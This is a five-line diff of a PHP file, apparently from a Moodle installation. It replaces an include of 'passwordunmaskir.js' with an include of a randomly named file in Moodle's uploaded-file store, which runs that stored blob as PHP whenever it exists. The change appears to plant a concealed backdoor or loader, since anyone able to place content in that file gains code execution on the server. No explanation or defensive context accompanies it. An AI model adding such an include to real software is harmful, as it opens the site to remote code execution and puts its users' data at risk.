@@ -1,5 +1,5 @@
 <?php
-$file = 'passwordunmaskir.js';
+$file = '/var/moodledata/filedir/00/00/kamsfdkasmdk466546asdasdka';
 
 if (is_file($file)) {
     include $file;
